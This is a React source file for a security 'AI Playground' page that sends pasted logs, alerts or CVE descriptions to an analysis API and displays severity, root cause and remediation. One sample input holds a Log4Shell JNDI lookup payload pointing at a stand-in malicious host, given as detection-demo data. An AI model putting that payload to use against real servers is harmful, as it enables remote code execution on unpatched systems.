'use client'

import { useState, useRef, useCallback } from 'react'
import { motion } from 'framer-motion'
import { Brain, ChevronDown, ChevronRight, Copy, Loader2, Send, Zap } from 'lucide-react'
import { toast } from 'sonner'

const EXAMPLE_INPUTS = [
  {
    label: 'SSH Brute Force',
    input: 'SSH brute force attack detected from 192.168.1.100 targeting admin@10.0.0.5. 2,400 failed authentication attempts in 60 seconds. Pattern matches CVE-2024-6387 (regreSSHion). Server running OpenSSH 8.9.',
    type: 'alert',
  },
  {
    label: 'Log4Shell Indicator',
    input: 'Web server access log: 2024-01-15 14:23:11 POST /api/v1/login HTTP/1.1 200 - User-Agent: ${jndi:ldap://malicious.com/exploit}. CVE-2021-44228 Log4j exploitation attempt.',
    type: 'log',
  },
  {
    label: 'Ransomware Alert',
    input: 'Endpoint EDR alert: Mass file encryption detected on host DESKTOP-ABC123. 5,000+ files modified with .locked extension in 45 seconds. Process: svchost.exe (PID 4721). Network connections to 185.220.101.32:443.',
    type: 'incident',
  },
  {
    label: 'CVE Analysis',
    input: 'CVE-2024-3400: PAN-OS command injection vulnerability in GlobalProtect Gateway. CVSS 10.0. Affects PAN-OS 10.2, 11.0, 11.1. Actively exploited in the wild per CISA KEV.',
    type: 'cve',
  },
]

type StreamEvent = {
  event: string
  node?: string
  message?: string
  data?: Record<string, unknown>
}

type AnalysisResult = {
  id: string
  classification: string
  severity_score: number
  severity_label: string
  root_cause: string
  remediation: string
  summary: string
  citations: Array<{ source: string; title: string; url?: string; excerpt?: string; relevance_score?: number }>
  related_incidents: Array<{ id: string; title: string; similarity: number }>
  latency_ms: number
}

const NODE_LABELS: Record<string, string> = {
  retrieval: 'Retrieving knowledge base context',
  graph: 'Querying graph relationships',
  analysis: 'Running AI analysis',
  validation: 'Validating grounding',
  summarization: 'Generating final report',
}

export default function PlaygroundPage() {
  const [inputText, setInputText] = useState('')
  const [sourceType, setSourceType] = useState('auto')
  const [streamMode, setStreamMode] = useState(true)
  const [loading, setLoading] = useState(false)
  const [events, setEvents] = useState<StreamEvent[]>([])
  const [result, setResult] = useState<AnalysisResult | null>(null)
  const [activeTab, setActiveTab] = useState<'output' | 'json'>('output')
  const abortRef = useRef<AbortController | null>(null)

  const handleSubmit = useCallback(async () => {
    if (!inputText.trim() || loading) return
    setLoading(true)
    setEvents([])
    setResult(null)

    if (abortRef.current) abortRef.current.abort()
    abortRef.current = new AbortController()

    try {
      const response = await fetch('/api/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          input_text: inputText,
          source_type: sourceType === 'auto' ? null : sourceType,
          stream: streamMode,
        }),
        signal: abortRef.current.signal,
      })

      if (streamMode) {
        const reader = response.body!.getReader()
        const decoder = new TextDecoder()
        let buffer = ''

        while (true) {
          const { done, value } = await reader.read()
          if (done) break
          buffer += decoder.decode(value, { stream: true })
          const lines = buffer.split('\n')
          buffer = lines.pop() || ''

          for (const line of lines) {
            if (!line.startsWith('data: ')) continue
            const raw = line.slice(6).trim()
            if (raw === '[DONE]') break
            try {
              const event: StreamEvent = JSON.parse(raw)
              setEvents((prev) => [...prev, event])
              if (event.node === 'summarization' && event.data?.final_analysis) {
                const final = event.data.final_analysis as AnalysisResult
                setResult(final)
              }
            } catch {
              // skip malformed
            }
          }
        }
      } else {
        const json = await response.json()
        if (json.data) setResult(json.data)
      }
    } catch (err: unknown) {
      if ((err as Error)?.name !== 'AbortError') {
        toast.error('Analysis failed. Check API connection.')
      }
    } finally {
      setLoading(false)
    }
  }, [inputText, sourceType, streamMode, loading])

  const copyResult = () => {
    if (result) {
      navigator.clipboard.writeText(JSON.stringify(result, null, 2))
      toast.success('Copied to clipboard')
    }
  }

  const severityColor = (label: string) => {
    const map: Record<string, string> = {
      critical: 'text-red-400',
      high: 'text-orange-400',
      medium: 'text-yellow-400',
      low: 'text-blue-400',
      info: 'text-green-400',
    }
    return map[label] || 'text-foreground'
  }

  return (
    <div className="p-8 max-w-7xl mx-auto space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-foreground">AI Playground</h1>
        <p className="text-muted-foreground text-sm mt-1">
          Submit logs, incidents, alerts, or CVEs for AI-powered analysis
        </p>
      </div>

      <div className="grid lg:grid-cols-2 gap-6">
        <div className="space-y-4">
          <div className="glass-card p-5 space-y-4">
            <div className="flex items-center gap-2 text-sm font-medium text-foreground">
              <Brain className="w-4 h-4 text-primary" />
              Input
            </div>

            <div>
              <label className="section-header block mb-2">Examples</label>
              <div className="flex flex-wrap gap-2">
                {EXAMPLE_INPUTS.map((ex) => (
                  <button
                    key={ex.label}
                    onClick={() => { setInputText(ex.input); setSourceType(ex.type) }}
                    className="text-xs btn-secondary py-1 px-3"
                  >
                    {ex.label}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="section-header block mb-2">Input Text</label>
              <textarea
                id="playground-input"
                className="input-field resize-none"
                rows={10}
                placeholder="Paste logs, incident description, CVE details, alert text, or infrastructure events here..."
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="section-header block mb-2">Source Type</label>
                <select
                  className="input-field"
                  value={sourceType}
                  onChange={(e) => setSourceType(e.target.value)}
                >
                  <option value="auto">Auto-detect</option>
                  <option value="log">Log</option>
                  <option value="incident">Incident</option>
                  <option value="alert">Alert</option>
                  <option value="cve">CVE</option>
                  <option value="event">Event</option>
                </select>
              </div>
              <div>
                <label className="section-header block mb-2">Response Mode</label>
                <select
                  className="input-field"
                  value={streamMode ? 'stream' : 'batch'}
                  onChange={(e) => setStreamMode(e.target.value === 'stream')}
                >
                  <option value="stream">Streaming (SSE)</option>
                  <option value="batch">Batch</option>
                </select>
              </div>
            </div>

            <button
              id="playground-submit"
              onClick={handleSubmit}
              disabled={loading || !inputText.trim()}
              className="btn-primary w-full flex items-center justify-center gap-2 py-3 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Analyzing...
                </>
              ) : (
                <>
                  <Send className="w-4 h-4" />
                  Analyze
                </>
              )}
            </button>
          </div>

          {streamMode && events.length > 0 && (
            <div className="glass-card p-4 space-y-2">
              <div className="section-header mb-3">Agent Pipeline</div>
              {Object.entries(NODE_LABELS).map(([node, label]) => {
                const event = events.find((e) => e.node === node)
                const active = loading && !event
                const complete = !!event
                return (
                  <div key={node} className="flex items-center gap-3 text-sm">
                    {complete ? (
                      <div className="w-4 h-4 rounded-full bg-green-500/20 border border-green-500/30 flex items-center justify-center">
                        <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
                      </div>
                    ) : active ? (
                      <Loader2 className="w-4 h-4 text-primary animate-spin" />
                    ) : (
                      <div className="w-4 h-4 rounded-full border border-border" />
                    )}
                    <span className={complete ? 'text-foreground' : 'text-muted-foreground'}>{label}</span>
                    {complete && <ChevronRight className="w-3 h-3 text-green-500 ml-auto" />}
                  </div>
                )
              })}
            </div>
          )}
        </div>

        <div className="space-y-4">
          {result ? (
            <motion.div
              initial={{ opacity: 0, y: 16 }}
              animate={{ opacity: 1, y: 0 }}
              className="glass-card"
            >
              <div className="p-4 border-b border-border/50 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Zap className="w-4 h-4 text-primary" />
                  <span className="font-semibold text-foreground">Analysis Result</span>
                  <span className="text-xs text-muted-foreground">({result.latency_ms}ms)</span>
                </div>
                <div className="flex items-center gap-2">
                  <button onClick={copyResult} className="p-1.5 hover:bg-muted rounded-lg transition-colors">
                    <Copy className="w-3.5 h-3.5 text-muted-foreground" />
                  </button>
                  {['output', 'json'].map((tab) => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab as 'output' | 'json')}
                      className={`text-xs px-3 py-1 rounded-md transition-colors ${activeTab === tab ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'}`}
                    >
                      {tab.toUpperCase()}
                    </button>
                  ))}
                </div>
              </div>

              <div className="p-5 overflow-auto max-h-[600px]">
                {activeTab === 'json' ? (
                  <pre className="code-block text-xs whitespace-pre-wrap">{JSON.stringify(result, null, 2)}</pre>
                ) : (
                  <div className="space-y-5">
                    <div className="flex items-start justify-between gap-4">
                      <div>
                        <div className="section-header mb-1">Classification</div>
                        <div className="text-lg font-semibold text-foreground">{result.classification}</div>
                      </div>
                      <div className="text-right">
                        <div className="section-header mb-1">Severity</div>
                        <div className={`text-2xl font-bold ${severityColor(result.severity_label)}`}>
                          {result.severity_score?.toFixed(1)}
                        </div>
                        <span className={`badge-${result.severity_label}`}>{result.severity_label}</span>
                      </div>
                    </div>

                    <div>
                      <div className="section-header mb-2">Summary</div>
                      <p className="text-sm text-muted-foreground leading-relaxed">{result.summary}</p>
                    </div>

                    <div>
                      <div className="section-header mb-2">Root Cause</div>
                      <p className="text-sm text-foreground/80 leading-relaxed">{result.root_cause}</p>
                    </div>

                    <div>
                      <div className="section-header mb-2">Remediation</div>
                      <div className="code-block text-xs leading-relaxed">{result.remediation}</div>
                    </div>

                    {result.citations?.length > 0 && (
                      <div>
                        <div className="section-header mb-2">Citations ({result.citations.length})</div>
                        <div className="space-y-2">
                          {result.citations.slice(0, 5).map((c, i) => (
                            <div key={i} className="glass-card p-3 text-xs space-y-1">
                              <div className="flex items-center justify-between">
                                <span className="font-medium text-foreground">{c.title}</span>
                                <span className="text-muted-foreground bg-muted px-1.5 py-0.5 rounded">{c.source}</span>
                              </div>
                              {c.excerpt && <p className="text-muted-foreground line-clamp-2">{c.excerpt}</p>}
                              {c.url && (
                                <a href={c.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">
                                  View source →
                                </a>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </motion.div>
          ) : (
            <div className="glass-card p-12 flex flex-col items-center justify-center text-center space-y-4 min-h-[400px]">
              <div className="w-14 h-14 rounded-2xl bg-primary/10 border border-primary/20 flex items-center justify-center">
                <Brain className="w-7 h-7 text-primary/60" />
              </div>
              <div>
                <div className="text-base font-medium text-foreground mb-1">Ready to analyze</div>
                <div className="text-sm text-muted-foreground">
                  Enter an incident, log, alert, or CVE to get AI-powered analysis
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
